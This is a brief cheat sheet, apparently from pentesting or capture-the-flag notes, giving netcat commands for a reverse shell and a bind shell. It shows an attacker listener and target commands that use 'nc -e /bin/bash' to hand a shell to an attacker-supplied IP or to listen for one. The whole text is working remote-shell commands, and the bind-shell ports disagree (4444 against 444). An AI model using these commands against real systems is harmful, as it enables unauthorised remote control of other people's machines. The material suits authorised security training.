### Reverse shell:
Attackbox:
nc -lvnp 4444

Target:
nc <ip> 4444 -e /bin/bash

### Bind shell:
Attackbox:
nc <ip> 4444

Target:
nc -lvnp 444 -e /bin/bash